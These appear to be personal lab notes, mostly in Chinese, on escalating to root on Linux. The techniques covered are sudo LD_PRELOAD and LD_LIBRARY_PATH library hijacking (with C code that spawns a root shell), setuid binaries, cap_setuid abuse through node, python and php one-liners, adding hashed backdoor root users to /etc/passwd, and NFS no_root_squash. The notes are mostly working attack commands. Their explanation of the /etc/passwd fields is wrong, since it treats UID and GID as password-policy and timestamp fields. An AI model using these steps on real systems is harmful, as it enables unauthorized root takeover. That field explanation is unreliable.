

---------------------------------------------------------


將g加入sudo 組
sudo usermod -aG sudo g

把g移除
sudo deluser g sudo


User g may run the following commands on kali:
    (ALL : ALL) ALL

这表示用户 "g" 具有

在任何主机上

以任何用户身份

执行任何命令的完全权限


--------------------------------------------------

这会打开 sudoers 文件的编辑器
sudo visudo



# 你的自定义规则
g ALL=(ALL:ALL) /bin/cat


--------------------------------------------------

sudo visudo

加入
Defaults env_keep += "LD_LIBRARY_PATH LD_PRELOAD"


------------------------------------------------------------------------
LD_PRELOAD


如果cat 可以sudo 這會導致root
sudo LD_PRELOAD=/tmp/shell.so   cat




------------------------------------------
 

LD_LIBRARY_PATH

LD_LIBRARY_PATH 是一个用于指定动态链接器在运行时查找共享库的路径的环境变量。动态链接器在程序运行时负责加载共享库，而 LD_LIBRARY_PATH 允许你指定额外的目录，告诉动态链接器在这些目录中查找共享库。

如果程序依赖于共享库，并且这些库不在默认的系统路径中，你可以使用 LD_LIBRARY_PATH 来告诉系统在哪里查找这些库。

sudo -l 找到apache2 。


lib_path.c
-------------------------------------
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
-------------------------------------

ldd /usr/sbin/apache2


找到libcrypt.so.1  竄改

(記住並不是所有的庫都能改，有些系統庫，不要動，動一些不動要的庫)
//這步需要嘗試錯誤。很多庫一動了，起動就失敗。所以最好程式越大，機會越多。

生成libcrypt.so.1  
gcc -o /tmp/libcrypt.so.1     -shared -fPIC /tmp/lib_path.c


sudo LD_LIBRARY_PATH=/tmp apache2
-----------------------------------------------------------------------


設置setuid

sudo chmod u+s /usr/bin/cat
sudo chmod u-s /usr/bin/cat


ls -al /usr/bin/cat


which apache2

/usr/sbin/apache2

sudo chmod u+s /usr/sbin/apache2

ls -al /usr/sbin/apache2
---------------------------------------------

測試LD_LIBRARY_PATH，LD_PRELOAD 這樣是否還要sudo 才能

setuid 不能使用以下，兩者都失敗，還是需要sudo 
LD_LIBRARY_PATH=/tmp apache2
LD_PRELOAD=/tmp/shell.so   apache2

---------------------------------------------

sudo chmod g+s /usr/bin/cat
sudo chmod g-s /usr/bin/cat

ls -al /usr/bin/cat

-----------------------------------------------------------------------
capabilities  

通常可以用寫程式的語言編輯器拿root


getcap /usr/bin/cat

getcap -r / 2>/dev/null


= 表示覆盖并设置。

+ 表示添加到。 

e (Effective): 表示将指定的 capability 添加到 "Effective" 集合中。这意味着进程在运行时将能够使用这个 capability。

p (Permitted): 表示将指定的 capability 添加到 "Permitted" 集合中。这意味着进程在其整个生命周期中都允许拥有这个 capability。

---------------------------------------------------------

先複制到當前目錄測試避免麻煩
cp $(which node) .

給能力給node
sudo setcap cap_setuid+ep node

拿root
./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

---------------------------------------------------------

python 範例

cp $(which python) .

sudo setcap cap_setuid+ep python

./python -c 'import os; os.setuid(0); os.system("/bin/sh")'

---------------------------------------------------------

PHP 範例

cp $(which php) .

sudo setcap cap_setuid+ep php


CMD="/bin/sh"
./php -r "posix_setuid(0); system('$CMD');"



-----------------------------------------------------------------------


另一個選擇是新增具有 root 權限的新使用者???
openssl passwd -1 -salt THM password1

password1 (密碼)
THM(鹽)



https://tomi.cc/hash/

$1$THM$WnbwlliCqxFRQepUTCkUT1

$1$ 表示 MDS

$THM$ salt = THM 

WnbwlliCqxFRQepUTCkUT1
哈希完成后的字符串

-----------------------------------------------
sudo chmod u+s /usr/bin/nano

nano /etc/passwd

添加
hacker123:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash




-----------------------------------------------
mkpasswd -m sha-512 123456

$6$G4xpY./2fWzNzi9i$ffVbwLDTOq7P4ph5tYnNTU.ur6Tw9Yd97UsiPHsT/4nRCuoiZZe4gf9HRttzNMDHYrBhs2qztr/rZU7O/unvM0:0:0:root:/root:/bin/bash

添加
hacker:$6$G4xpY./2fWzNzi9i$ffVbwLDTOq7P4ph5tYnNTU.ur6Tw9Yd97UsiPHsT/4nRCuoiZZe4gf9HRttzNMDHYrBhs2qztr/rZU7O/unvM0:0:0:root:/root:/bin/bash




这是用户的其他属性，每个字段由冒号分隔。以下是这些字段的含义：

1. `:0`: 这是密码策略字段，通常包括密码的最短生存期、最长生存期等信息。在这个情况下，`:0` 表示没有密码策略限制。

2. `0`: 这是密码最后一次修改的时间戳字段。通常是从 1970 年 1 月 1 日开始的天数。

3. `root`: 这是用户所属的初始组。在这里，用户属于 `root` 组。

4. `/root`: 这是用户的主目录路径。在这里，用户的主目录是 `/root`。

5. `/bin/bash`: 这是用户的默认 shell。在这里，用户的默认 shell 是 Bash。

这些字段的详细解释可能会因不同的系统而异，但通常遵循相似的格式和规则。这些信息对于管理用户账户和权限非常重要。


-----------------------------------------------

sudo nano /etc/exports

設置no_root_squash
/path/to/shared/directory *(rw,no_root_squash)
